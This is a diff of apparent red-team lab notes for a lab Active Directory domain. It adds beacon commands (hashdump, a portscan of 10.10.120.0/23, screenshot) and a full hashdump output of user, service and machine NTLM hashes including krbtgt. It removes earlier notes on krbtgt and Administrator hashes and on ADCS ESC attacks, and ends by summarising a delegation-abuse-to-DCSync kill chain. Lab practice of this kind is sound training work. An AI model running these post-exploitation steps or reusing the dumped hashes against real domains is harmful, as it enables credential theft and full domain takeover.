@@ -294,19 +294,35 @@ Credentials:
 ## End
 
 ```                                   
-1. Clean up impersonation on LON-WKSTN-1
-beacon> rev2self
+note london dc
+hashdump
 
-2. Confirm krbtgt hash is saved — already in your log, but note these key values:
 
-  krbtgt  AES256: 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
-  krbtgt  NTLM:   2d454c2120b54890b3db65406e5a5974
+[05/20 14:57:01] [+] [job 1] received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2d454c2120b54890b3db65406e5a5974:::
+pchilds:1105:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+rsteel:1108:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+dyork:1109:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+oracle_svc:3101:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+mssql_svc:3102:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+crobin:3103:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+LON-DC-1$:1000:aad3b435b51404eeaad3b435b51404ee:7f3217fd8f6b9c14fefbd2888c710735:::
+LON-WS-1$:1110:aad3b435b51404eeaad3b435b51404ee:6aebff13c1104e5976142e8ea435fffb:::
+LON-FS-1$:1111:aad3b435b51404eeaad3b435b51404ee:18141ec2f3e83bff48075be427263c1d:::
+LON-WKSTN-1$:2101:aad3b435b51404eeaad3b435b51404ee:3cad4d50decc7d04e6fec0a3c3793cc0:::
+LON-WKSTN-2$:2102:aad3b435b51404eeaad3b435b51404ee:14e9b8f0d0bbdcf4dd64964e60aebecb:::
+LON-DB-1$:4601:aad3b435b51404eeaad3b435b51404ee:cce3f72b3b4bcffe0af7979588b885b6:::
+LON-DB-2$:6601:aad3b435b51404eeaad3b435b51404ee:eaaecc5850514fd440004b7b527c5d45:::
+LON-CS-1$:9101:aad3b435b51404eeaad3b435b51404ee:d484d958efea3fda03432c3ef91b4fed:::
 
-  Admin   AES256: 0b4a6bc13049439c555b145635f4837e5a866005a3b032d4b6fe42bd1db49886
-  Admin   NTLM:   fc525c9683e8fe067095ba2ddc971889
+desktop
 
-3. LON-CS-1 for next lab session — that's the ADCS Certificate Authority. ESC attacks (ESC1, ESC8 coerce relay) are a separate lab topic but now you have the full DA context to attack.
+portscan 10.10.120.0-10.10.121.255 1-1024,3389,5000-6000 arp 1024
+
+screenshot
 ```
 
->Lab objective: COMPLETE. Constrained delegation abuse → SYSTEM on LON-DC-1 → DCSync krbtgt. Full kill chain and extra.  
+>Lab objective: COMPLETE. Kerberos Constrained delegation abuse → SYSTEM on LON-DC-1 → DCSync krbtgt. Full kill chain and extra.  
 
